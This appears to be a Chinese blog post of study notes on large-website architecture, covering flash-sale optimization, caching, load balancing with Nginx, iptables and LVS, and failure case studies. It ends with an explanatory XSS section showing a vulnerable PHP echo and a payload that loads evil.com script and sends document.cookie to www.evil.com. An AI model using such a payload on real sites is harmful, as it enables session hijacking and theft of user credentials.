---
layout: post
title:  "SystemDesign"
date: 2017-04-05 00:00:04
categories: 技术问题分类总结
tags: 系统设计
excerpt: ""
---

* content
{:toc}

## 秒杀系统性能优化思路

将请求尽量拦截在系统上游，并且充分利用缓存。由上游至低层优化如下：
* 1.前端（浏览器、APP）
控制实际往后端发送请求的数量，如用户点击“查询”后，将按钮置灰，禁止用户在短时间内重复提交。

* 2.站点层（访问后端数据，拼写html返回）
**对uid进行请求计数和去重，比如5秒内只准透过一个请求**（可以使用redis设置过期时间实现）。缺点是当有多台机器时（此时相当于5s内限制n个访问），数据可能不准（脏读,但数据库层面真实数据是没问题的）。
假设有海量真实的对站点层的请求，可以通过增加机器来扩容，实在不行只能抛弃部分请求（返回稍后再试），原则是要保护系统，不能让所有用户都失败；

* 3.服务层（提供数据访问）
对于读请求，使用缓存。
对于写请求，使用请求队列（队列成本很低），每次只透有限的写请求（如总票数）去数据层，如果均成功，再放下一批。可以不用统一一个队列，这样的话每个服务透过更少量的请求（总票数/服务个数），这样简单。统一一个队列又复杂了。对于失败的处理无需重放，返回用户查询失败或者下单失败，架构设计原则之一是fail fast。

* 4.数据层（数据库、缓存）
经过以上步骤，到数据库层的请求已经有限。
此外还可以做一些业务规则上的优化，如：12306分时分段售票、数据粒度优化（如只展示有、无，而不是具体的数量）、业务逻辑异步（先创建订单，但是状态为未支付，如果超时仍未支付，则恢复库存）。


## 大型网站架构演化发展历程及优化思路
* 1.初始阶段的网站架构：应用程序、数据库、文件等所有的资源都在一台服务器上。
* 2.应用服务和数据服务分离：使用三台服务器：应用服务器、文件服务器和数据库服务器。这三台服务器对硬件资源的要求各不相同。
* 3.使用缓存改善网站性能：缓存在应用服务器上的本地缓存或缓存在专门的分布式缓存服务器上的远程缓存。
* 4.使用应用服务器集群改善网站的并发处理能力：对网站架构而言，只要能通过增加一台服务器的方式改善负载压力，就可以以同样的方式持续增加服务器不断改善系统性能，从而实现系统的可伸缩性。
* 5.数据库读写分离；
* 6.使用反向代理和CDN加速网站响应：基本原理都是缓存，区别在于CDN部署在网络提供商的机房，使用户在请求网站服务时，可以从距离自己最近的网络提供商机房获取数据；而反向代理则部署在网站的中心机房，当用户请求到达中心机房后，首先访问的服务器是反向代理服务器，如果反向代理服务器中缓存着用户请求的资源，就将其直接返回给用户。
* 7.使用分布式文件系统和分布式数据库系统：分布式数据库是网站数据库拆分的最后手段，只有在单表数据规模非常庞大的时候才使用。不到不得已时，网站更常用的数据库拆分手段是业务分库。
* 8.使用NoSQL和搜索引擎；（主要用于优化数据搜索）
* 9.业务拆分：根据产品线划分，将一个网站拆分成许多不同的应用，每个应用独立部署维护。
* 10.分布式服务：将共用的业务提取出来（比如用户模块），独立部署。由这些可复用的业务去连接数据库，提供共用业务服务，而应用系统只需要通过分布式服务调用共用业务服务完成具体业务操作。

网站架构其实并不难，真正能解决问题的技术一定是简单的。在网站还很小的时候就去追求网站的架构是舍本逐末，得不偿失的。小型网站最需要做的就是为用户提供好的服务来创造价值，得到用户的认可，活下去，野蛮生长。大型网站架构技术的核心价值不是从无到有搭建一个大型网站，而是能够伴随小型网站业务的逐步发展，慢慢地演化成一个大型网站。驱动大型网站技术发展的主要力量是网站的业务发展。
——《大型网站技术架构》


## 常见大型网站架构模式
* 1.分层：将系统在横向维度上切分成几个部分（为应用层、服务层、数据层），每个部分负责一部分相对比较单一的职责，然后通过上层对下层的依赖和调用组成一个完整的系统。
在开发过程中，严格遵循分层架构的约束，禁止跨层次的调用及逆向调用。
* 2.分割：分割就是在纵向方面对软件进行切分。将不同的功能和服务分割开来，包装成高内聚低耦合的模块单元，一方面有助于软件的开发和维护；另一方面，便于不同模块的分布式部署，提高网站的并发处理能力和功能扩展能力。
* 3.分布式：分层和分割的一个主要目的是为了切分后的模块便于分布式部署，即将不同模块部署在不同的服务器上，通过远程调用协同工作。常用的分布式方案有以下几种：分布式应用和服务、分布式静态资源、分布式数据和存储、分布式计算；
* 4.集群：对于用户访问集中的模块（比如网站的首页），还需要将独立部署的服务器集群化，即多台服务器部署相同应用构成一个集群，通过负载均衡设备共同对外提供服务。可以提供更好的并发特性，扩展性和可用性。
* 5.缓存：大型网站架构设计在很多方面都使用了缓存设计：CDN、反向代理、本地缓存、分布式缓存；
* 6.异步：业务之间的消息传递不是同步调用，而是将一个业务操作分成多个阶段，每个阶段之间通过共享数据的方式异步执行进行协作。
* 7.冗余：需要一定程度的服务器冗余运行，数据冗余备份，这样当某台服务器宕机时，可以将其上的服务和数据访问转移到其他机器上，从而提高可用性。
* 8.自动化：目前大型网站的自动化架构设计主要集中在运维发布和监控方面。网站需要对线上生产环境进行自动化监控，对服务器进行心跳检测，并监控其各项性能指标和应用程序的关键数据指标。
* 9.安全；

## 大型网站核心架构要素
* 性能：从用户浏览器到数据库，影响用户请求的所有环节都可以进行性能优化。
* 可用性：主要手段是冗余。
* 伸缩性：伸缩性是指通过不断向集群中加入服务器的手段来缓解不断上升的用户并发访问压力和不断增长的数据存储需求。
* 扩展性：，网站的扩展性架构直接关注网站的功能需求。网站快速发展，功能不断扩展，如何设计网站的架构使其能够快速响应需求变化，是网站可扩展架构主要的目的。
* 安全性；

## 网站性能测试指标及性能优化方法
**性能测试指标**
* 1.响应时间；
* 2.并发数；
* 3.吞吐量；在系统并发数由小逐渐增大的过程中，系统吞吐量先是逐渐增加，达到一个极限后，随着并发数的增加反而下降，达到系统崩溃点后，系统资源耗尽，吞吐量为零。
* 4.性能计数器：描述服务器或操作系统性能的一些数据指标。包括Sys-tem Load、对象与线程数、内存使用、CPU使用、磁盘与网络I/O等指标。

**性能测试方法**
* 1.性能测试：对系统不断施加压力，验证系统在资源可接受范围内，是否能达到性能预期。
* 2.负载测试：对系统不断地增加并发请求以增加系统压力，直到系统的某项或多项性能指标达到安全临界值（而非上限值）；
* 3.压力测试：超过安全负载的情况下，对系统继续施加压力，直到系统崩溃或不能再处理任何请求，以此获得系统最大压力承受能力。
* 4.稳定性测试：被测试系统在特定硬件、软件、网络环境条件下，给系统加载一定业务压力，使系统运行一段较长时间，以此检测系统是否稳定。

**Web前端性能优化**
* 1.浏览器访问优化：合并文件减少请求、使用浏览器缓存、启用压缩等等。
* 2.CDN（Content Distribute Network，内容分发网络）加速的本质仍然是一个缓存，而且将数据缓存在离用户最近的地方，使用户以最快速度获取数据，即所谓网络访问第一跳。
* 3.反向代理，略。

**应用服务器性能优化**
* 1.分布式缓存；
* 2.异步操作；消息队列具有很好的削峰作用——即通过异步处理，将短时间高并发产生的事务消息存储在消息队列中，从而削平高峰期的并发事务。
* 3.使用集群；
* 4.代码优化；

**存储性能优化**
* 1.固态硬盘；
* 2.B+树vs.LSM树；在LSM树上进行一次数据更新不需要磁盘访问，在内存即可完成，速度远快于B+树。当数据访问以写操作为主，而读操作则集中在最近写入的数据上时，使用LSM树可以极大程度地减少磁盘的访问次数，加快访问速度。
* 3.RAID vs. HDFS；

## 网站可用性度量
业界通常用多少个9来衡量网站的可用性，如QQ的可用性是4个9，即QQ服务99.99%可用，这意味着QQ服务要保证其在所有运行时间中，只有0.01%的时间不可用，也就是一年中大约最多53分钟不可用。
高可用的网站架构的主要手段是数据和服务的冗余备份及失效转移。

## 集群环境下Session管理的几种手段
* 1.Session复制：应用服务器开启Web容器的Session复制功能，在集群中的几台服务器之间同步Session对象，使得每台服务器上都保存所有用户的Session信息；（只能使用在集群规模比较小的情况下）
* 2.Session绑定：负载均衡服务器总是将来源于同一IP的请求分发到同一台服务器上（也可以根据Cookie信息将同一个用户的请求总是分发到同一台服务器上),这种方法又被称作会话黏滞。该方案显然不符合系统高可用的需求。
* 3.利用Cookie记录Session；
* 4.Session服务器；

## 高可用的服务设计
* 1.分级管理：运维上将服务器进行分级管理，核心应用和服务优先使用更好的硬件，在运维响应速度上也格外迅速。
* 2.超时设置：在应用程序中设置服务调用的超时时间，一旦超时，通信框架就抛出异常，应用程序根据服务调度策略，可选择继续重试或将请求转移到提供相同服务的其他服务器上。
* 3.异步调用；
* 4.服务降级：在网站访问高峰期，服务可能因为大量的并发调用而性能下降，严重时可能会导致服务宕机。为了保证核心应用和功能的正常运行，需要对服务进行降级。降级有两种手段：拒绝服务及关闭服务。
* 5.幂等性设计：服务重复调用是无法避免的，应用层也不需要关心服务是否真的失败，只要没有收到调用成功的响应，就可以认为调用失败，并重试服务调用。因此必须在服务层保证服务重复调用和调用一次产生的结果相同，即服务具有幂等性。

## 高可用的数据设计及其局限性
为了保证数据的高可用，网站通常会牺牲另一个也很重要的指标：数据一致性。
CAP原理：一个提供数据服务的存储系统无法同时满足数据一致性（Consistency）、数据可用性（Availibility）、分区耐受性（Patition Tolerance，系统具有跨网络分区的伸缩性）这三个条件。
失效转移操作由三部分组成：失效确认、访问转移、数据恢复。

## 网站的伸缩性
所谓网站的伸缩性是指不需要改变网站的软硬件设计，仅仅通过改变部署的服务器数量就可以扩大或者缩小网站的服务处理能力。

## 实现负载均衡的基本技术
1. HTTP重定向负载均衡：HTTP重定向服务器，根据用户的HTTP请求计算一台真实的Web服务器地址，并将该Web服务器地址写入HTTP重定向响应中（响应状态码302）返回给用户浏览器。
2. DNS域名解析负载均衡：在DNS服务器中配置多个A记录。
3. 反向代理负载均衡：需要配置双网卡和内部外部两套IP地址。由于反向代理服务器转发请求在HTTP协议层面，因此也叫应用层负载均衡。
4. IP负载均衡：在网络层通过修改请求目标地址进行负载均衡。
5. 数据链路层负载均衡：在通信协议的数据链路层修改mac地址进行负载均衡。（又称作三角传输模式）。通过配置真实物理服务器集群所有机器虚拟IP和负载均衡服务器IP地址一致，从而达到不修改数据包的源地址和目的地址就可以进行数据分发的目的，由于实际处理请求的真实物理服务器IP和数据请求目的IP一致，不需要通过负载均衡服务器进行地址转换，可将响应数据包直接返回给用户浏览器，避免负载均衡服务器网卡带宽成为瓶颈。这种负载均衡方式又称作直接路由方式（DR）。

## 负载均衡算法
* 1.轮询（Round Robin，RR）；
* 2.加权轮询（Weighted Round Robin，WRR）；
* 3.随机（Random）；
* 4.最少连接（Least Connections）；
* 5.源地址散列（Source Hashing）；

## 分布式缓存的一致性Hash算法
和所有服务器都部署相同应用的应用服务器集群不同，分布式缓存服务器集群中不同服务器中缓存的数据各不相同，缓存访问请求不可以在缓存服务器集群中的任意一台处理，必须先找到缓存有需要数据的服务器，然后才能访问。
必须让新上线的缓存服务器对整个分布式缓存集群影响最小，也就是说新加入缓存服务器后应使整个缓存服务器集群中已经缓存的数据尽可能还被访问到，这是分布式缓存集群伸缩性设计的最主要目标。（路由算法至关重要）
一致性Hash算法通过一个叫作一致性Hash环的数据结构实现KEY到缓存服务器的Hash映射。具体算法过程为：先构造一个长度为0~2的整数环（这个环被称作一致性Hash环），根据节点名称的Hash值（其分布范围同样为0~232）将缓存服务器节点放置在这个Hash环上。然后根据需要缓存的数据的KEY值计算得到其Hash值（其分布范围也同样为0~232），然后在Hash环上顺时针查找距离这个KEY的Hash值最近的缓存服务器节点，完成KEY到服务器的Hash映射查找。当缓存服务器集群需要扩容的时候，只需要将新加入的节点名称（NODE3）的Hash值放入一致性Hash环中，由于KEY是顺时针查找距离其最近的节点，因此新加入的节点只影响整个环中的一小段。100台服务器扩容增加1台服务器，继续命中的概率是99%。虽然仍有小部分数据缓存在服务器中不能被读到，但是这个比例足够小，通过访问数据库获取也不会对数据库造成致命的负载压力。
具体应用中，这个长度为2的一致性Hash环通常使用二叉查找树实现，Hash查找过程实际上是在二叉查找树中查找不小于查找数的最小数值。当然这个二叉树的最右边叶子节点和最左边的叶子节点相连接，构成环。


## 大型网站分布式服务的需求与特点
* 1.负载均衡；
* 2.失效转移；
* 3.高效的远程通信；
* 4.整合异构系统；
* 5.对应用最少侵入；
* 6.版本管理；
* 7.实时监控；

## 密钥安全管理
* 1.把密钥和算法放在一个独立的服务器上，甚至做成一个专用的硬件设施，对外提供加密和解密服务，应用系统通过调用这个服务，实现数据的加解密。
* 2.将加解密算法放在应用系统中，密钥则放在独立服务器中，为了提高密钥的安全性，实际存储时，密钥被切分成数片，加密后分别保存在不同存储介质中，兼顾密钥安全性的同时又改善了性能。

## 大型网站典型故障：写日志也会引发故障
现象：某应用服务器集群发布后不久就出现多台服务器相继报警，硬盘可用空间低于警戒值，并且很快有服务器宕机。登录到线上服务器，发现log文件夹里的文件迅速增加，不断消耗磁盘空间。
原因：开发人员将log输出的level全局配置为Debug。

## 大型网站典型故障：高并发访问数据库引发的故障
现象：数据库Load居高不下，远超过正常水平，持续报警。
原因：发现报警是因为某条SQL引起的，这条SQL是一条简单的有索引的数据查询，不应该引发报警。继续检查，发现这条SQL执行频率非常高，远远超过正常水平。追查这条SQL，发现被网站首页应用调用，首页是被访问最频繁的网页，这条SQL被首页调用，也就被频繁执行了。

## 大型网站典型故障：高并发情况下锁引发的故障
现象：某应用服务器不定时地因为响应超时而报警，但是很快又超时解除，恢复正常，如此反复，让运维人员非常苦恼。
原因：程序中某个单例对象（singleton object）中多处使用了synchronized（this），由于this对象只有一个，所有的并发请求都要排队获得这唯一的一把锁。一般情况下，都是一些简单操作，获得锁，迅速完成操作，释放锁，不会引起线程排队。但是某个需要远程调用的操作也被加了synchronized（this），这个操作只是偶尔会被执行，但是每次执行都需要较长的时间才能完成，这段时间锁被占用，所有的用户线程都要等待，响应超时，这个操作执行完后释放锁，其他线程迅速执行，超时解除。

4. 大型网站典型故障：缓存引发的故障
现象：没有新应用发布，但是数据库服务器突然Load飙升，并很快失去响应。DBA将数据库访问切换到备机，Load也很快飙升，并失去响应。最终引发网站全部瘫痪。
原因：一个缺乏经验的工程师关闭了缓存服务器集群中全部的十几台Memcached服务器，导致了网站全部瘫痪的重大事故。

5. 大型网站典型故障：应用启动不同步引发的故障
现象：某应用发布后，服务器立即崩溃。
原因：应用程序Web环境使用Apache.JBoss的模式，用户请求通过Apache转发JBoss。在发布时，Apache和JBoss同时启动，由于JBoss启动时需要加载很多应用并初始化，花费时间较长，结果JBoss还没有完全启动，Apache就已经启动完毕开始接收用户请求，大量请求阻塞在JBoss进程中，最终导致JBoss崩溃。除了这种Apache和JBoss启动不同步的情况，网站还有很多类似的场景，都需要后台服务准备好，前台应用才能启动，否则就会导致故障。这种情况被内部人戏称作“姑娘们还没穿好衣服，老鸨就开门迎客了”。

6. 大型网站典型故障：大文件读写独占磁盘引发的故障
现象：某应用主要功能是管理用户图片，接到部分用户投诉，表示上传图片非常慢，原来只需要一两秒，现在需要几十秒，有时等半天结果浏览器显示服务器超时。
原因：图片需要使用存储，最有可能出错的地方是存储服务器。检查存储服务器，发现大部分文件只有几百KB，而有几个文件非常大，有数百兆，读写这些大文件一次需要几十秒，这段时间，磁盘基本被这个文件操作独占，导致其他用户的文件操作缓慢。

7. 大型网站典型故障：滥用生产环境引发的故障
现象：监控发现某个时段内，某些应用突然变慢，内部网络访问延迟非常厉害。
原因：原来有工程师在线上生产环境进行性能压力测试，占用了大部分交换机带宽。

8. 大型网站典型故障：不规范的流程引发的故障
现象：某应用发布后，数据库Load迅速飙升，超过报警值，回滚发布后报警消除。
原因：发现该应用发布后出现大量数据库读操作，而这些数据本来应该从分布式缓存读取。检查缓存，发现数据已经被缓存了。检查代码，发现访问缓存的那行代码被注释掉了。原来工程师在开发的时候，为了测试方便，特意注释掉读取缓存的代码，结果开发完成后忘记把注释去掉，直接提交到代码库被发布到线上环境。

9. 大型网站典型故障：不好的编程习惯引发的故障
现象：某应用更新某功能后，有少量用户投诉无法正常访问该功能，一点击就显示出错信息。
原因：分析这些用户，都是第一次使用该功能，检查代码，发现程序根据历史使用记录构造一个对象，如果该对象为null，就会导致NullPointException。

## 带宽及其限制因素
数据发送的过程（数据从主机进入线路的过程）：
* 1.应用程序将要发送的数据写入进程的内存地址空间中；（运行时变量赋值）
* 2.应用程序向内核发出系统调用，内核将数据从用户态内存复制到由内核维护的内核缓冲区中。（内核缓冲区的大小是有限的，所有要发送的数据以队列形式进入，这些数据可能来自于多个进程）
* 3.内核通知网卡控制器前来取数据，同时CPU转而处理其他进程。网卡控制器根据网卡驱动信息得知对应的内核缓冲区的地址，并将要发送的数据复制到网卡的缓冲区中。在以上的数据复制过程中，数据始终按照连接两端设备的内部总线宽度来复制，比如在32位总线的主机系统中，网卡一般也使用32位总线宽度，那么从内核缓冲区到网卡缓冲区的数据复制过程中，任何时刻只能复制32位的比特信息。
* 4.网卡将缓冲区中的数据按位转换成不同的光电信号，然后将数据的每个位按照顺序依次发出。

带宽指数据的发送速度。具体取决于以下两个因素：
* 1.信号传输频率：即数据发送装置将二进制信号传送至线路的能力以及另一端的数据接收装置对二进制信号的接收能力，同时也包含线路对传输频率的支持程度。
* 2.数据传播介质的并行度，完全等价于计算机系统总线宽度的概念。比如将若干条光纤并行组成光缆，这样就可以在同一个横截面上同时传输多个信号。
所以，要提高计算机总线的带宽，包括提高总线频率和总线宽度两种方法。

## 中继器的作用
网络通信相比于计算机内部的数据传输而言有一个很大的不同，其传输距离比较大，所以信号在传播介质中会衰减，为此需要借助中继器来延续信号，而每次中继器转发信号又会消耗一些发送时间。

## 共享带宽和独享带宽的区别
运营商会在所有的基础交换节点上设置关卡，即限制数据从用户主机流入路由器转发队列的速度。
如果某台主机使用了独享10M带宽，且路由器的出口带宽为100M，那么`交换机的设置应该保证来自该广播域内的其他主机的数据发送速度总和不超过90Mbit/s`，以此保证该主机任何时刻都可以以10Mbit/s的速度发送数据。即该主机独享路由器的一部分出口带宽。
如果是共享100M带宽，则交换机不保证主机的出口带宽能达到100M。


## 服务器响应时间理解
响应时间即数据从服务器开始发送直到完全到达用户PC的这段时间。
* 响应时间 = 发送时间 + 传播时间 + 处理时间
* 发送时间 = 数据量/带宽，当存在多个交换节点时，也应该包含每个节点的转发时间
* 传播时间 = 传播距离/传播速度

处理时间指数据在交换节点中为存储转发而进行一些必要处理所花费的时间，主要是数据在缓冲区队列中排队所花费的时间。
* 下载速度 = 数据量字节数/响应时间
在实际的互联网中，瓶颈也可能出现在各互联网运营商之间的网络互连上。


## 吞吐率与最大并发数
吞吐率指服务器单位时间内处理的请求数，是在一定并发用户数的情况下服务器处理请求能力的量化体现。
通常所讲的最大并发数是有一定的利益前提的，即服务器和用户双方所期待的最大收益的平衡。得出最大并发数的意义在于了解服务器的承载能力。
需要注意的是，所谓的最大并发数并非指和真实用户的一一对应关系，因为一个真实用户可能会给服务器带来多个并发用户数压力。
从Web服务器的角度来看，实际并发用户数也可以理解为Web服务器当前维护的、代表不同用户的文件描述符总数，Web服务器一般会限制同时服务的最多用户数，当实际并发用户数大于服务器所维护的文件描述符总数时，多出来的用户请求将在服务器内核的数据接收缓冲区中等待处理。

## 将站点的Cookies作用域设置为顶级域名存在的问题
通常不同的Web组件使用不同的域名、服务器：
www.xxx.com
img.xxx.com
js.xxx.com
等。

对组件进行分离的好处：
* 1.实现了服务器端的负载均衡；
* 2.提高浏览器在下载Web组件时的并发数；

需要注意的是，当使用站点的二级域名作为组件服务器地址，并且将站点的cookies作用域设置为顶级域名时，每次对图片、js文件等组件的请求都会带上本地的cookies，这将增加HTTP头信息的长度。一个常见的解决方案是为Web组件启用新的域名。


## 负载均衡实现：HTTP重定向
```
HTTP/1.1 302 Found
...
Location: http://xxx.com/xxxx
```

基于HTTP重定向的负载均衡实现比较简单，通过Web程序即可实现：
```php
<?php
  $domains = [
    'www1.xxx.com',
    'www2.xxx.com',
    'www3.xxx.com',
  ];
  
  $index = substr(microtime(),5,3) % count($domains);
  $domain = $domains[$index];

  header("Location:http://$domain");
```

注意，这里采用随机方式，而没有采用轮询（RR，Round Robin）的方式，因为HTTP协议是无状态的，如果要实现轮询，需要额外的工作，比如维持一个互斥的计数变量（任何时候只有一个请求可以修改），对性能不利。

Apache的mod_rewrite模块可以支持RR重定向：
```
<VirtualHost *:80>
  DocumentRoot /data/www/highperfweb/htdocs
  ServerName www.xxx.com
  RewriteEngine on
  RewriteMap    lb prg:/data/www/lb.pl
  RewriteRule   ^/(.+)$ $(lb:$l)
</VirtualHost>
```
/data/www/lb.pl是一个脚本，实现了轮询均衡负载的逻辑。

顺序调度的性能总是比不上随机调度的性能，好处在于可以实现绝对的均衡。

注意，实际生产环境中次数的均衡不一定等于负载的均衡，比如不同用户的访问深度是不一样的。

## 负载均衡实现：DNS负载均衡
DNS完成域名到IP的映射，这种映射也可以是一对多的，这时DNS服务器便起到了负载均衡调度器的作用。
可以使用dig命令来查看指定域名DNS的A记录设置：
```
dig www.qq.com
```
可以看到有些域名可能有多个A记录设置，因而多次ping同一个域名IP可能变化。可以结合使用A记录和CNAME实现基于DNS服务器的，类似HTTP重定向的负载均衡：
```
www1.xxx.com IN A 10.0.1.1
www2.xxx.com IN A 10.0.1.2
www3.xxx.com IN A 10.0.1.3
www.xxx.com  IN CNAME www1.xxx.com
www.xxx.com  IN CNAME www2.xxx.com
www.xxx.com  IN CNAME www3.xxx.com
```
不用担心DNS服务器本身的性能，因为DNS记录可以被用户浏览器、互联网接入服务商的各级DNS服务器缓存。

## 负载均衡实现：反向代理负载均衡
因为Web反向代理服务器的核心工作就是转发（而不是转移）HTTP请求，工作在应用层，因此反向代理的负载均衡也称为七层负载均衡。主流的Web服务器都支持基于反向代理的负载均衡。

使用Nginx实现反向代理服务器：
```
upstream backend {
  server 10.0.1.200:80 weight=3;
  server 10.0.1.201:80 weight=1;
}
```

主流的反向代理服务器HAProxy，略。

接口人瓶颈：反向代理服务器进行转发操作本身是需要一定开销的，比如创建线程、与后端服务器建立TCP连接、接收后端服务器返回的处理结果、分析HTTP头信息、用户空间和内核空间的频繁切换等，当后端服务器处理请求的时间非常短时，转发的开销就显得很突出。
所以，工作在HTTP层面的反向代理服务器扩展能力的制约不仅取决于自身的并发处理能力，同时也取决于其转发开销是否上升为主要时间。（当后端服务器比较少，且处理数据的时间比较短时（比如静态文件），反向代理的转发开销上升为主要时间，极端情况下有可能造成整体的吞吐率不及单台后端服务器）

使用Varnish作为调度器来监控后端服务器的可用性，可脚本编程，判断HTTP状态等，略。



## 负载均衡实现：NAT负载均衡
NAT工作在传输层，可以对数据包中的IP地址和端口信息进行修改，也称四层负载均衡。
Linux内核中的Netfilter模块可以修改IP数据包，它在内核中维护着一些数据包过滤表，这些表包含了用于控制数据包过滤的规则。当网络数据包到达服务器的网卡并且进入某个进程的地址空间之前先要通过内核缓冲区，此时Netfilter便对数据包有着绝对的控制权，可以修改数据包、改变路由规则。
Netfilter位于内核中，Linux提供了命令行工具iptables来对Netfilter的过滤表进行操作。

使用iptables为Web服务器配置防火墙，只允许外部网络通过TCP与当前机器的80端口建立连接：
```
iptables -F INPUT
iptables -A INPUT -i eth0 -p tcp --dport 80 -j ACCEPT
iptables -P INPUT DROP
```

使用iptables实现本机端口重定向，将所有从外网进入80端口的请求转移到8000端口：
```
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REJECT -- to-port 8000
```

使用iptables实现NAT，将外网网卡8001端口接收的所有请求转发给10.0.1.210这台服务器的8000端口：
```
echo 1 > /proc/sys/net/ipv4/ip_forward  # 打开调度器的数据包转发选项
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 8001 -j DNAT -- to-destination 10.0.1.210:8000
```
注意，还需要同时将实际服务器的默认网关设置为NAT服务器（NAT服务器必须为实际服务器的网关）：
```
route add default gw 10.0.1.50
```

## 负载均衡实现：IPVS
IP Virtual Server，类似于Netfilter，也工作于Linux内核中，但是更专注于实现IP负载均衡。不仅可以实现NAT的负载均衡，还可以实现直接路由、IP隧道等负载均衡。
Linux提供ipvsadm工具来管理IPVS，可以用来快速实现负载均衡系统，也称为LVS（Linux Virtual Server）：
```
echo 1 > /proc/sys/net/ipv4/ip_forward  # 打开调度器的数据包转发选项
route add default gw 10.0.1.50  # 将实际服务器的默认网关设置为NAT服务器

ipvsadm -A -t 125.12.12.12:80 -s rr  # 添加一台虚拟服务器（负载均衡调度器）
ipvsadm -a -t 125.12.12.12:80 -r 10.0.1.210:8000 -m  # 实际服务器
ipvsadm -a -t 125.12.12.12:80 -r 10.0.1.211:8000 -m  # 实际服务器
```
LVS还提供一系列的动态调度策略，如LC（最小连接）、WLC（带权重的最小连接）、SED（最短期望时间延迟）等。

瓶颈：NAT负载均衡服务器的转发能力主要取决于NAT服务器的网络带宽，包括内部网络和外部网络。


## 负载均衡实现：直接路由负载均衡
直接路由负载均衡调度器工作在数据链路层（第二层），它通过修改数据包的目标MAC地址将数据包转发到实际服务器上，更重要的是`实际服务器的响应数据包直接发送给客户端，而不经过调度器`（基于IP别名实现）。实际服务器必须直接接入外部网络。

可以为一个网络接口（物理网卡eth0、eth1，或者回环接口）配置多个IP地址（IP别名），一个网络接口最多可以设置256个IP别名。（即一个网卡可以设置多个IP地址，且它们拥有相同的MAC地址）
```
ifconfig eth0:0 125.12.12.77
```
此时通过ifconfig可以看到eth0、eth0:0两个配置。在同网络的另一台机器上查看ARP表有以下记录：
```
Address        HWtype   HWaddress          Flags Mask        Iface
125.12.12.12   ether    00:19:B9:DF:B0:52  C                 eth0
125.12.12.77   ether    00:19:B9:DF:B0:52  C                 eth0
```
给实际服务器添加和调度器IP地址相同的IP别名，当调度器收到数据包时，修改数据包的目标MAC地址（IP地址不变），将它转发给实际服务器。

LVS-DR负载均衡系统网络结构：
服务器          外网IP          默认网关         IP别名
负载均衡调度器   125.12.12.12    125.12.12.1     125.12.12.77
实际服务器1      125.12.12.20    125.12.12.1     125.12.12.77
实际服务器2      125.12.12.21    125.12.12.1     125.12.12.77

将站点的域名指向125.12.12.77这个IP别名，同时将IP别名添加到回环接口lo上，并设置路由规则，让服务器不要去寻找其他拥有这个IP别名的服务器：
```
ifconfig lo:0 125.12.12.77 broadcast 125.12.12.77 netmark 255.255.255.255 up
route add -host 125.12.12.77 dev lo:0
```

此外还要防止实际服务器响应来自网络中针对IP别名的ARP广播：
```
echo "1" > /proc/sys/net/ipv4/conf/lo/arp_ignore
echo "2" > /proc/sys/net/ipv4/conf/lo/arp_announce
echo "1" > /proc/sys/net/ipv4/conf/all/arp_ignore
echo "2" > /proc/sys/net/ipv4/conf/all/arp_announce
```

在调度服务器上通过ipvsadm进行以下配置，设置通过直接路由的方式转发数据包：
```
ipvsadm -A -t 125.12.12.77:80 -s rr
ipvsadm -a -t 125.12.12.77:80 -r 125.12.12.20:80 -q
ipvsadm -a -t 125.12.12.77:80 -r 125.12.12.21:80 -q
```
LVS-DR相对于LVS-NAT的优势在于实际服务器的响应数据包可以不经过调度器而直接发往客户端，显然要发挥这种优势需要响应数据包的数量和长度远远大于请求数据包（事实上大多数Web服务的响应和请求并不对称）。
对于LVS-DR，一旦调度器失效，可以通过增加几条DNS记录的方式快速将LVS-DR切换到DNS-RR模式。

## 负载均衡实现：IP隧道
LVS-TUN与LVS-DR类似，主要区别在于实际服务器和调度器可以不在同一个WAN网段，调度器通过IP隧道技术来转发请求到实际服务器。即将调度器收到的IP数据包封装在一个新的IP数据包中，转交给实际服务器，然后实际服务器的响应数据包可以直接到达用户端。
前提条件是所有的服务器都必须支持IP Tunneling或者IP Encapsulation协议。

是选择LVS-TUN还是LVS-DR更多地不是因为性能和扩展性，而是取决于网络部署需要，比如CDN服务需要将实际服务器部署在不同的IDC，从而必须使用IP隧道技术。


## 粘滞会话
所谓粘滞会话就是通过调整调度策略，让同一用户在一次会话周期内的所有请求始终转发到一台特定的后端服务器上（毫无规律的转发会使服务器上的缓存利用率下降，此外当后端服务器启用Session来本地化保存用户数据时，如果用户的再次请求被转发到其他的机器，将导致Session数据无法访问）。对于Nginx，只需要在upstream中声明ip_hash即可：
```
upstream backend {
  ip_hash;
  server 10.0.1.200:80 weight=3;
  server 10.0.1.201:80 weight=1;
}
```
当然，也可以利用Cookies机制来设计持久性算法，比如将后端服务器的编号追加到用户的Cookies中。

粘滞会话破坏了均衡策略，应该使用分布式Session、分布式缓存。

## 分布式文件系统
分布式文件系统并不是传统意义上的文件系统，它工作在操作系统的用户空间由应用程序实现，这使得分布式文件系统可以不依赖于底层文件系统的具体实现，只要是POSIX兼容的文件系统即可。

分布式文件系统拥有自己独特的内容组织结构，便于对大规模存储和复制进行合理规划，例如Hadoop：
```
hadoop dfs -ls
hadoop dfs -mkdir html
hadoop dfs -put /data/www/htdocs/index.htm html/
...
```
MogileFS，基于perl实现，略。

分布式文件系统内部可能跨越多个服务器，并根据规则进行自动的文件复制。在分布式文件系统中，所有的文件都存储在被称为存储节点的地方，一个存储节点往往对应物理磁盘上的一个实际目录。追踪器负责存储节点之间的调度（负载均衡、故障转移、控制复制策略等），并响应用户的请求。

**分布式文件系统的好处**
* 组建包含大量廉价服务器的海量存储系统；
* 通过内部的冗余复制，保证文件的可用性；
* 拥有非常好的可扩展性；
* 可以通过扩展来保证性能；


## 跨站脚本攻击（XSS）
Cross Site Script，指通过HTML注入篡改了网页，插入恶意脚本，从而在用户浏览网页时执行攻击。（一开始这种攻击都是用来演示跨域攻击的，所以叫跨站脚本，到如今是否跨域已经不再重要）

例：
```
<?php
$input = $_GET["param"];
echo "<div>" . $input . "</div>";
?>
```
提交这样一个请求：
```
test.php?param=<script>alert(/xss/)</script>
```

**XSS Payload**
XSS Payload实际上就是JavaScript脚本，所以任何JavaScript脚本能实现的功能XSS Payload都能做到。比如读取Cookies，从而发起Cookies劫持攻击（Cookies中可能有登录凭证）；
例如攻击者先加载这样一个远程脚本：
http://www.a.com/test.html?abc="><script src=http://www.evil.com/evil.js></script>"，正在的Payload写在这个远程脚本中从而避免直接在URL参数中写入大量的Javascript代码。在evil.js中通过如下方式窃取Cookies：
```
var img = document.createElement("img");
img.src = "http://www.evil.com/log?"+escape(document.cookie);
document.body.appendChild(img);
```
【test.html的内容没有，上面的例子不通顺，艹】


